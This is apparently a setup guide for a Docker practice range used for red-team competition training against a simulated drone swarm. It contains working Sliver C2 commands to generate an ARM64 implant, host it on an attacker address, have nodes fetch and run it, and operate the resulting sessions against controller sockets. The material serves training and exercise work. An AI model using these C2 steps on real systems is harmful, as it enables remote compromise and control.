# VICEROY Gilded Guardian Practice Range - Deployment Guide

## Overview

This guide will help you deploy and configure the Mantis swarm practice environment for VICEROY Gilded Guardian competition training. The range has been pre-configured to match the official competition specifications exactly.

## Prerequisites

- Docker and Docker Compose installed
- Minimum 8GB RAM available for containers
- Linux host (tested on Ubuntu 20.04+)
- SSH keys for team access

## Network Architecture

```
Attack Network: 172.21.0.0/24
├── Attack Station: 172.21.0.100 (SSH: port 2222)
└── (Sliver listeners)

Mantis Swarm Network: 172.20.0.0/16
├── Controllers: 172.20.1.1-5 (HTTP: port 10000)
├── Sensors: 172.20.2.1-6 (HTTP: port 10000)  
├── Boomers: 172.20.3.1-15 (HTTP: port 10000)
└── Scoreboard: 172.20.10.1 (HTTP: port 8080)
```

## Phase 1: Initial Deployment

### Step 1: Build and Start the Environment

```bash
# In the Viceroy directory
make build

# Start all containers (26 nodes + attack station + scoreboard)
docker-compose up -d

# Verify all containers are running
docker-compose ps
```

Expected output: 28 containers (5 controllers + 6 sensors + 15 boomers + 1 attack station + 1 scoreboard)

### Step 2: Verify Node Communication

```bash
# Check controller election (should show leadership election in progress)
docker logs mantis-controller-1 | tail -20

# Check sensor connectivity
docker logs mantis-sensor-1 | tail -10

# Check boomer connectivity  
docker logs mantis-boomer-1 | tail -10
```

### Step 3: Configure Team SSH Access

```bash
# Create SSH keys for each team member
mkdir -p keys
ssh-keygen -t ed25519 -f keys/dash -N ""
ssh-keygen -t ed25519 -f keys/phoenix -N ""
ssh-keygen -t ed25519 -f keys/recon -N ""

# Copy public keys for container mounting
cp keys/*.pub keys/

# Restart attack station to load new keys
docker-compose restart attack-station
```

### Step 4: Test Attack Station Access

```bash
# Test SSH access (replace 'dash' with actual username)
ssh -p 2222 -i keys/dash dash@localhost

# Should see MOTD:
# === GILDED GUARDIAN — ATTACK STATION ===
```

## Phase 2: Sliver C2 Configuration

### Step 5: Generate Sliver Implant

SSH into the attack station and configure Sliver:

```bash
# SSH to attack station
ssh -p 2222 -i keys/dash dash@localhost

# Start Sliver server (first time setup)
sliver-server daemon &

# Connect with client
sliver

# Generate ARM64 Linux implant for the swarm
sliver > generate --http 172.21.0.100:8443 --os linux --arch arm64 --save /var/www/golden.exe

# Verify implant was created
ls -la /var/www/golden.exe
file /var/www/golden.exe  # Should show: ARM64 ELF
```

### Step 6: Start HTTP Listener

In the Sliver console:

```bash
# Start HTTP listener on port 8443
sliver > http -l 172.21.0.100 -p 8443

# Verify listener is active
sliver > jobs
```

### Step 7: Serve Implant via HTTP

In a separate terminal on the attack station:

```bash
# Serve the implant on port 8443 from /var/www/
cd /var/www
python3 -m http.server 8443 --bind 172.21.0.100
```

**CRITICAL:** The nodes are configured to fetch from `http://172.21.0.100:8443/golden.exe` every 5 seconds when beacon is enabled.

## Phase 3: Activate Beacon Callbacks

### Step 8: Enable Beacon System

The beacon system is disabled by default. To enable it:

```bash
# Edit each config to enable beacon callbacks
# Controllers don't need beacons, but sensors/boomers do

# Example for boomer-1:
docker exec mantis-boomer-1 sed -i 's/"enabled": false/"enabled": true/' /etc/mantis/config.json

# Or batch enable for all workers:
for i in {1..6}; do
    docker exec mantis-sensor-$i sed -i 's/"enabled": false/"enabled": true/' /etc/mantis/config.json
done

for i in {1..15}; do
    docker exec mantis-boomer-$i sed -i 's/"enabled": false/"enabled": true/' /etc/mantis/config.json
done

# Restart all worker nodes to pick up config changes
docker-compose restart sensor-1 sensor-2 sensor-3 sensor-4 sensor-5 sensor-6
docker-compose restart boomer-1 boomer-2 boomer-3 boomer-4 boomer-5 boomer-6 boomer-7 boomer-8 boomer-9 boomer-10 boomer-11 boomer-12 boomer-13 boomer-14 boomer-15
```

### Step 9: Monitor for Callbacks

In Sliver, monitor for incoming sessions:

```bash
sliver > sessions
# Should start showing sessions from worker nodes
```

**Expected behavior:** Worker nodes will attempt to download and execute golden.exe every 5 seconds. Successful executions will create new Sliver sessions.

## Phase 4: Validation and Testing

### Step 10: Test Controller Access

```bash
# Get session on a controller node (will need to be manually compromised)
# Controllers don't have auto-callback, they need to be compromised via other means
# Or temporarily enable beacon on a controller for testing

# Test socket structure on controller-1
sliver > use <session-id>
sliver (session) > ls /run/
sliver (session) > ls /run/commsDaemon/
sliver (session) > ls /run/electionDaemon/
```

Should show the socket files:
- `/run/commsDaemon/comms.sock`
- `/run/electionDaemon/election.sock` 
- `/run/hwDaemon/hw.sock`

### Step 11: Test Playbook Scripts

Create test versions of the playbook scripts:

```bash
# On attack station, create /tmp/test_check_leader.py
cat > /tmp/test_check_leader.py << 'EOF'
#!/usr/bin/env python3
import socket, json, sys

try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect('/run/electionDaemon/election.sock')
    raw = s.recv(409600).decode()
    s.close()
    coa = json.loads(raw)
    endorsements = coa.get("endorsements", [])
    if len(endorsements) > 0:
        print(f"LEADER: YES ({len(endorsements)} endorsements)")
    else:
        print("LEADER: NO")
except Exception as e:
    print(f"ERROR: {e}")
EOF

# Upload and test via Sliver
sliver (session) > upload /tmp/test_check_leader.py /tmp/check_leader.py
sliver (session) > execute /run/current-system/sw/bin/python3 /tmp/check_leader.py
```

### Step 12: Verify Configuration Accuracy

Check that configs match playbook expectations:

```bash
# Test config format on controller
sliver (session) > execute /run/current-system/sw/bin/cat /etc/mantis/config.json | head -20

# Verify UUIDs and network layout match your configs
# Should see:
# - 5 controllers in 172.20.1.x range
# - 6 sensors in 172.20.2.x range  
# - 15 boomers in 172.20.3.x range
```

## Phase 5: Team Training Setup

### Step 13: Create Team Workspace

```bash
# Create shared directories for team collaboration
docker exec attack-station mkdir -p /workspace/{scripts,logs,intel}
docker exec attack-station chmod 1777 /workspace/{scripts,logs,intel}
```

### Step 14: Install Playbook Scripts

Copy the official playbook scripts to the attack station:

```bash
# Upload the playbook scripts to /workspace/scripts/
# They can be customized per team requirements
```

### Step 15: Document Access Information

Create a team info sheet:

```bash
cat > TEAM_ACCESS.md << 'EOF'
# VICEROY Gilded Guardian - Team Access

## SSH Access
- **Host:** your-server-ip:2222
- **Users:** dash, phoenix, recon
- **Keys:** Use provided SSH private keys

## Network Layout
- **Attack Station:** 172.21.0.100
- **Controllers:** 172.20.1.1 to 172.20.1.5
- **Sensors:** 172.20.2.1 to 172.20.2.6
- **Boomers:** 172.20.3.1 to 172.20.3.15
- **Scoreboard:** http://your-server-ip:8080

## Sliver Access
- Server runs on attack station
- Connect with: `sliver`
- HTTP listener: 172.21.0.100:8443
- Implant path: `/var/www/golden.exe`

## Key Files
- **Scripts:** `/workspace/scripts/`
- **Logs:** `/workspace/logs/`
- **Intel:** `/workspace/intel/`
EOF
```

## Troubleshooting

### Container Issues
```bash
# Check container health
docker-compose ps

# View logs for specific node
docker logs mantis-controller-1

# Restart individual container
docker-compose restart controller-1
```

### Network Connectivity Issues
```bash
# Test inter-node communication
docker exec mantis-controller-1 curl -s http://172.20.1.2:10000/health

# Check socket permissions
docker exec mantis-controller-1 ls -la /run/*/
```

### Sliver Issues  
```bash
# Restart Sliver server
pkill sliver-server
sliver-server daemon &

# Check listener status
sliver > jobs

# Regenerate implant if needed
sliver > generate --http 172.21.0.100:8443 --os linux --arch arm64 --save /var/www/golden.exe
```

## Security Notes

- This is a practice environment - do not expose to public internet
- Use strong SSH keys for team access
- Monitor container resource usage
- Regularly backup team work in `/workspace/`

## Reset Procedures

To reset the environment between training sessions:

```bash
# SSH to attack station and run
reset-range

# Or from host (nuclear option)
make reset-hard
```

This will restart all containers and clear any persistent state.

---

**Environment successfully configured for VICEROY Gilded Guardian competition training.**